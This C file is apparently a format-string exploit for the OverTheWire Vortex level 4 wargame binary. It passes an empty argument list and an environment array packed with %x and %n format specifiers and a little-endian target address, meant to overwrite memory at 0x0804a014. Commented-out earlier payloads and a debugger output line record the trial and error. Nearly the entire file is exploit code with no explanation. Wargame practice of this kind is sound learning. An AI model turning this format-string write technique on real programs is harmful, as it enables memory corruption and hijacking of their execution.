#include <stdlib.h>

char *newargs[] = { NULL };
char *newenv[] = { 
    "CCCC", 
    "\x14\xa0\x04\x08", 
    //"AAAAAAAAAAAAAAAA%.010u%1$x%.010u%1$x%.010u%1$x%.010u%1$x",
    //"AAAA%.010u",
//AAAA4160737280|804847b[Inferior 1 (process 235624) exited with code 01]
    // need to overwrite *0x804a014 with env[3]
    //"AAAA%10$x.%n\x14\xa0\x04\x08",
    //"\x14\xa0\x04\x08%48$x|%n|",
    //"%08x.%08x.%08x.%08x.%08x.%08x %s \n",
    "AAAaA%.010u%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n%1uAAA\x14\xa0\x04\x08.\x14\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n\n",
    "\x14\xa0\x04\x08", 
};

int main(int argc, char *argv[]) {
    execvpe("/home/bmoar/git/hacking/otw/vortex/4/vortex4", newargs, newenv);
}
